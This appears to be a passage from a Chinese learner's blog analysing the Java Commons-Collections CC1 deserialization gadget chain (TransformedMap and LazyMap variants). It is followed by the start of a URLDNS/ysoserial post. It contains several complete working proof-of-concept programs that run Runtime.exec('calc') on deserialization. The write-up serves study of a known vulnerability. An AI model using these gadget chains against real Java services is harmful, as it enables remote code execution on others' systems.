这里**？代表一个未知的类型，但是，这个未知的类型实际上是Collection**的一个子类，Collection是这个通配符的上限。\n同时看这个构造方法里面的 if 语句代码，这里只要满足任何一个条件就会进入到if语句，导致不能正常赋值。这里重点关注!type.isAnnotation()代码，这里的isAnnotation()函数就是用来判断Class对象是否是表示一个注解类型。所以这里需要一个传入一个注解类型的Annotation。也就是下图中有@的类：\n选择上面的任意一个注解类型的类应该都是可以的\n所以可以构造代码如下：\n1 2 3 4 5 Class clazz = Clas.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDelaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); constructor1.newInstance(Rention.class,ctf); //ctf即构造好的TransformedMap 现在解决了memberValues值的问题。\n2.继续看readObject()方法的源码\n为了方便学习，我们尝试直接拼接一下前面的总结出来的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Test { public static void main(String[] args) throws Exception { ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); Map map2 = TransformedMap.decorate(hashMap,null,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,map2); //序列化 serialize(o); //反序列化 unserialize(); } public static void serialize(Object o) throws Exception { ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); } public static void unserialize() throws Exception { ObjectInputStream o = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); o.readObject(); o.close(); } } 再打断点调试发现是在readObject()地方出现问题，现在来跟一下readObject()的源码，打断点如下：\n先来看这两串代码：\n1 2 3 annotationType = AnnotationType.getInstance(type); 和 Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); 简单看看结果：\n第一行代码将annotationType被赋值为了AnnotationType实例，所以第二行代码就会调用AnnotationType类的memberTypes()方法:\n所以最终readObject()方法里面的memberTypes为HashMap类的实例。\n这里还要说明一个点，关于for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet())这个循环遍历的代码问题，在打断点过程中，我发现如下打断点会直接结束：\n那就说明在我上面拼接的代码在反序的时候并没有成功进入到这个for语句中，我猜测是这个循环遍历的问题，去查看前面给的文章的举例代码，直接看测试代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import java.util.Map; import java.util.HashMap; public class reflect { public static void main(String[] args) throws Exception { Map\u0026lt;Integer, String\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(1, \u0026#34;value1\u0026#34;); map.put(2, \u0026#34;value2\u0026#34;); map.put(3, \u0026#34;value3\u0026#34;); map.put(4, \u0026#34;value4\u0026#34;); map.put(5, \u0026#34;value5\u0026#34;); for (Integer key : map.keySet()) { System.out.println(\u0026#34;key: \u0026#34; + key + \u0026#34; value: \u0026#34; + map.get(key)); } System.out.println(); for (Map.Entry\u0026lt;Integer, String\u0026gt; entry : map.entrySet()) { System.out.println(\u0026#34;成功进入循环遍历\u0026#34;); System.out.println(\u0026#34;key: \u0026#34; + entry.getKey() + \u0026#34; value: \u0026#34; + entry.getValue()); } } } 成功输出\n但是当我使用如下代码测试：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import java.util.Map; import java.util.HashMap; public class reflect { public static void main(String[] args) throws Exception { Map\u0026lt;Integer, String\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); for (Integer key : map.keySet()) { System.out.println(\u0026#34;key: \u0026#34; + key + \u0026#34; value: \u0026#34; + map.get(key)); } System.out.println(); for (Map.Entry\u0026lt;Integer, String\u0026gt; entry : map.entrySet()) { System.out.println(\u0026#34;成功进入循环遍历\u0026#34;); System.out.println(\u0026#34;key: \u0026#34; + entry.getKey() + \u0026#34; value: \u0026#34; + entry.getValue()); } } } 却什么都没有，这个结果那就确实说明了*我们需要向Map中键入至少一对键值对才能成功进入到这个for循环。*后续有个问题，直接讲了：\n这里看readObject()源码，可以知道需要将这个值设置为String那么测试代码就可以改成如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Test { public static void main(String[] args) throws Exception { ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;ceshi\u0026#34;,\u0026#34;value1\u0026#34;); Map map2 = TransformedMap.decorate(hashMap,null,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,map2); //序列化 serialize(o); //反序列化 unserialize(); } public static void serialize(Object o) throws Exception { ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); } public static void unserialize() throws Exception { ObjectInputStream o = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); o.readObject(); o.close(); } } 再调试成功进入for循环，但是并没有成功弹出计算机，那么继续打断点，如下打断点时会直接退出\n说明并没有进入这个if条件，那么现在重点关注memberType的赋值语句：\n再在if语句打一个断点，此时值的情况为：\n那么现在看一下这个调用的get方法，前面已经说过了memberTypes为HashMap类实例，那现在就看HashMap类的get方法，源码如下：\n1 2 3 4 public V get(Object key) { Node\u0026lt;K,V\u0026gt; e; return (e = getNode(hash(key), key)) == null ? null : e.value; } 那现在再如下打断点：\n调试跟进，发现最终其作用的点就是getNode()方法，这个方法会在哈希表中查找对应的节点，如果相匹配就会返回对应的节点，比如如果匹配到我设置的ceshi键和值value1，那么就会返回对应节点，否则就会返回null。\n后续的如何匹配就是注释相关技术了，在这里想要成功通过的条件为：\nsun.reflect.annotation.AnnotationInvocationHandler构造函数的第一个参数必须是Annotation的子类，且其中必须含有至少一个方法，假设方法名是X 那么被TransformedMap.decorate修饰的Map中必须有一个键名为X的元素 所以在这里我们需要将键设置为value，因为注解类有名为value的方法： 所以最终的可利用的POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Test { public static void main(String[] args) throws Exception { ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;xxx\u0026#34;); Map map2 = TransformedMap.decorate(hashMap,null,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,map2); //序列化 serialize(o); //反序列化 unserialize(); } public static void serialize(Object o) throws Exception { ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); } public static void unserialize() throws Exception { ObjectInputStream o = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); o.readObject(); o.close(); } } 成弹出一个计算机。\n现在来看一下setValue()方法后续调用的方法的源码：\n然后就是TransformedMap类的checkSetValue()方法： 由于我们前面就将valueTransformer设置为了chain链，所以后续都会往预估方向发展，具体过程可以参考前面的基础代码部分。\n——————————\n然后总结一下前面的问题：\n还是要注意一下Runtime类不能实例化的问题 反射获取AnnotationInvocationHandler类 进入for循环的需要put键值对的问题 if条件的进入条件 在拉通整个过程时的调试过程中遇到的问题：\n暂时对于很多都是初步了解吧，跟源码其实还有点看不懂，后面再来看看，简单给出示例代码，也许可以在调试过程中更容易理解：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class Main { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map\u0026lt;String, String\u0026gt; innerMap = new HashMap\u0026lt;\u0026gt;(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;xxx\u0026#34;); Map\u0026lt;String, String\u0026gt; outerMap = TransformedMap.decorate(innerMap, null, transformerChain); try { for (Map.Entry\u0026lt;String, String\u0026gt; entry : outerMap.entrySet()) { System.out.println(\u0026#34;成功进入循环遍历\u0026#34;); System.out.println(entry); System.out.println(\u0026#34;key: \u0026#34; + entry.getKey() + \u0026#34; value: \u0026#34; + entry.getValue()); } } catch (Exception e) { e.printStackTrace(); } } } 打断点如下：\n看此时的值： 然后再看上面的实例代码给出的结果：\n暂时就通过实例来稍微理解一下，看这个entry的值，前面所属就是AbstractInputCheckedMapDecorator$MapEntry（主要就是这里所属为什么是这个还有点不清楚），这样也就能够说明为什么readObject()方法中在调用setValue()方法时会到这个MapEntry类（就算直接在readObject方法打断点所属还是这个），从而导致整条链子的执行。\nLazyMap链 实际上，在ysoserial链中，它利用的并不是TransformedMap，而是利用的LazyMap。\n分析及构造过程 LazyMap的漏洞触发点是它的get()方法get方法，也就是get方法源码中的factory.transform()。也就是LazyMap的作用是“懒加载”，在get找不到值的时候，它会调用factory.transform方法去获取一个值：\n1 2 3 4 5 6 7 8 9 10 public Object get(Object key) { if (!this.map.containsKey(key)) { //审代码如果传入的key不存在，就会才会进入这个if条件 Object value = this.factory.transform(key); this.map.put(key, value); return value; } else { return this.map.get(key); } } 相较于TransformedMap链的利用方法，LazyMap的利用更复杂一些，由于sun.reflect.annotation.AnnotationInvocationHandler的readObject方法中没有调用到Map的get方法。但是AnnotationInvocationHandler类的invoke方法有调用到get方法，源码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public Object invoke(Object proxy, Method method, Object[] args) { String member = method.getName(); Class\u0026lt;?\u0026gt;[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(\u0026#34;equals\u0026#34;) \u0026amp;\u0026amp; paramTypes.length == 1 \u0026amp;\u0026amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); if (paramTypes.length != 0) throw new AssertionError(\u0026#34;Too many parameters for an annotation method\u0026#34;); switch(member) { case \u0026#34;toString\u0026#34;: return toStringImpl(); case \u0026#34;hashCode\u0026#34;: return hashCodeImpl(); case \u0026#34;annotationType\u0026#34;: return type; } // Handle annotation member accessors Object result = memberValues.get(member); if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() \u0026amp;\u0026amp; Array.getLength(result) != 0) result = cloneArray(result); return result; } 那么如何调用到AnnotationInvocationHandler#invoke呢？这里就可以利用到动态代理。\n现在先回到LazyMap的get()方法源码，重点分析一下if语句：\n1 2 3 4 5 6 7 public Object get(Object key) { if (!this.map.containsKey(key)) { //审代码如果传入的key不存在，就会才会进入这个if条件 Object value = this.factory.transform(key); this.map.put(key, value); return value; } 来看进入if语句的条件，this.map.containsKey(key)就是看键值表中是否有这个key，在这里需要没有这个key才能进入if条件；那么这个key对应的invoke中的代码就是String member = method.getName(); 学过动态代理的话就知道这里的member对应的就是代理对象调用的方法名，一般在一个java对象中都不会有一个以方法名为键的键值对，所以一般这里的if条件其实是可以忽略的。然后我想了一下，如果我认为设置一个键值对的键就是代理对象要调用的方法名称，那么是否应该不会继续下去。理论上是个人感觉是可以的，后面实践一下。\n——\n现在继续链子的说明\n前面说到了需要用动态代理，所以这里需要用到java.lang.reflect.Proxy以及InvocationHandler接口\n在这里AnnotationInvocationHandler实现了InvocationHandler接口并重写了invoke方法，符合基本条件。\n看代码所需的对象，这里就看看在哪些地方需要注意： 首先就是AnnotationInvocationHandler#invoke中调用get()的地方，memberValues.get(member);，所以这里的membervalues需要为LazyMap类对象，所以我们可以如下构造：\n1 2 3 4 Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstroctor(Class.class,Map.class); constroctor1.setAccessible(true); object o = constructor1.newInstance(Retention.class,outerMap); 现在再来看一下outerMap的内容，现在首先就需要看一下LazyMap的构造方法等，稍微看一下源码，可以知晓我们利用到的代码为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 public static Map decorate(Map map, Transformer factory) { return new LazyMap(map, factory); } protected LazyMap(Map map, Transformer factory) { super(map); if (factory == null) { throw new IllegalArgumentException(\u0026#34;Factory must not be null\u0026#34;); } else { this.factory = factory; } } 所以我们可以如下构造：\n1 2 3 4 Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Transformer outerMap = LazyMap.decorate(hashMap,chain); 再将前面综合一下，就是如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,outerMap); } } 最基本的链子大概如上，现在就是思考如何跳到LazyMap的get方法，结合前面的说法，现在就是要思考如何设置代理对象，结合动态代理的流程，在这里我们将Map接口类作为“中间”类，刚好“委托类”LazyMap是实现了Map接口的，所以是很合适的。\n然后理解一下ysoserial链，可以知晓在遍历Map(proxy)时会调用memberValues.entrySet方法，进而可以触发invoke方法。\n一步一步来，所以首先我们这里构造handler，\n1 InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); 然后调用Proxy的newProxyInstance()方法，用来创建一个代理对象，如下：\n1 2 3 //ysoerial链这里其实利用的是Map.class的构造器等，但是其实在最后的利用中差别不大，先跟这个 Class[] interfaces = Map.class.getInterfaces(); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),interfaces,outerMap); 这样就成功创建了一个代理对象，这是再看ysoserial，精妙的地方来了，如下代码：\n1 Object o = constructor1.newInstance(Retention.class,proxyMap); 然后再将这个o序列化并反序列化，当反序列化的时候，会对proxyMap调用entryMap()方法，此时就会到AnnotationInvocationHandler的invoke方法，然后一切都会往预期的方向发展。再将前面所有的代码结合起来稍微改改，就是如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileInputStream; import java.io.FileOutputStream; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); Class[] interfaces = Map.class.getInterfaces(); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),interfaces,handler); Object o = constructor1.newInstance(Retention.class,proxyMap); //序列化 ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(o); x.close(); //反序列化 ObjectInputStream ctf = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); ctf.readObject(); ctf.close(); } } 报错\n这是因为在设置代理对象时的第二个参数Map.class.getInterfaces()的Map.class并没有实现Map接口，动态代理没掌握好，照猫画虎了属于是，所以这里完全是多此一举了，我们就可以直接使用Map.class即可，而且本身Map就是一个接口类。\n所以最终的POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileInputStream; import java.io.FileOutputStream; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler); Object o = constructor1.newInstance(Retention.class,proxyMap); //序列化 ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(o); x.close(); //反序列化 ObjectInputStream ctf = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); ctf.readObject(); ctf.close(); } } 成功弹出计算机：\n——————\n思考 OK，现在就是解决前面遗留的问题。\n1.设置一个方法名称对应的键的实践，也就是加一个hashMap.put(\u0026quot;entrySet\u0026quot;,\u0026quot;xxxx\u0026quot;); 。最后的测试代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileInputStream; import java.io.FileOutputStream; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); hashMap.put(\u0026#34;entrySet\u0026#34;,\u0026#34;xxxx\u0026#34;);//here!!!! Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler); Object o = constructor1.newInstance(Retention.class,proxyMap); //序列化 ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(o); x.close(); //反序列化 ObjectInputStream ctf = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); ctf.readObject(); ctf.close(); } } 最终并没有弹出计算机，想法正确。\n2,.创建代理对象时的方法参数问题，在我们想要利用的LazyMap链中，其实只要到了AnnotationInvocationHandler#invoke中，正确调用了get方法，那么对于后续的如正常代理中的会去到委托类一下都是无意义的，而且这里本身LazyMap就实现了Map接口，所以在创建代理对象的时候，可以像前面的POC那样构造，但其实使用LazyMap也是可以的，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileInputStream; import java.io.FileOutputStream; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); Class[] interfaces = LazyMap.class.getInterfaces(); Map proxyMap = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),interfaces,handler); Object o = constructor1.newInstance(Retention.class,proxyMap); //序列化 ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(o); x.close(); //反序列化 ObjectInputStream ctf = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); ctf.readObject(); ctf.close(); } } 也成功弹出计算机：\nCC1的局限 在Java 8u71以后，官方修改了sun.reflect.annotation.AnnotationInvocationHandler的readObject方法。\n改动后，不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再执行set或put操作，也就不会触发RCE了。\n参考文章： （后面CC链都是跟过的，还有的不止CC链，可以多看看别人的博客，比如第一个人的就是，强推）\nhttps://su18.org/post/ysoserial-su18-2/#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-2\nhttps://xz.aliyun.com/t/10387?time__1311=Cqjx2Qi%3DomqGqGNDQieiKd7KF8DAhOi3RiD#toc-2\n当然nivia的博客： https://nivi4.notion.site/Java-CommonCollections2-bffcf256243d414192c43fdefc916df9\n","date":"2024-07-13T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/cc1/","title":"CC1"},{"content":"URLDNS URLDNS是ysoserial中利用链的一个名字，通常用于检测是否存在Java反序列化漏洞，该利用链有如下特点：\nURLDNS 利用链只能发起DNS请求，并不能进行其他利用 不限制jdk版本，使用Java内置类，对第三方依赖没有要求 目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞 可以在ysoserial项目源码里看到URLDNS利用链的源码，地址。也可以扒到本地来再在idea上调试。\nidea配置调试ysoserial 先直接在github上下载源码，然后再用idea打开这个项目即可，我用的JDK8，此时pom.xml会报错，此时就点击idea右边的m，如下：\n然后将里面所有的配置文件勾选，再点击左上角两个箭头旋转的标识即可。\n随后就不会再报错。\n此时我们再看pom.xml，来找项目的入口点（就是主类和main函数），如下：\n根据这个找到 